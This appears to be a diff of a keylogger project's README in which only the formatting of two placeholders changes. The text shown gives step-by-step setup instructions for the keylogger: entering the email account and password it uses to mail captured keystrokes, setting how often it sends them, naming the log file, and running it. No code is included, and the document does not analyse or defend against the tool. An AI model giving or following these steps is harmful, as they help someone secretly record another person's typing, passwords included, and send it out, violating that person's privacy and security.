@@ -6,7 +6,7 @@ Important Disclaimer: The author will not be held responsible for the abuse of t
 
 1) Install Python version 3 on your computer from https://python.org. Make sure you install the pip package manager (it should be an option that the Python installer gives).
 2) Download the file and open it up in a text editor.
-3) Change "YOUREMAIL@gmail.com" and "YOURPASSWORD" to your preferred email/password that you want the keylogger to email the keylogs to. 
+3) Change `YOUREMAIL@gmail.com` and `YOURPASSWORD` to your preferred email/password that you want the keylogger to email the keylogs to. 
 4) You can change `self.emailInterval` to the interval the keylogger should send the email with keylogs (in seconds). It is currently set to 3600 seconds which is 1 hour.
 5) You can also change the name of the file that contains the keylogs. By default, it is called "keylogs.txt".
 6) At this point, you can run the keylogger program as a python program `.py`
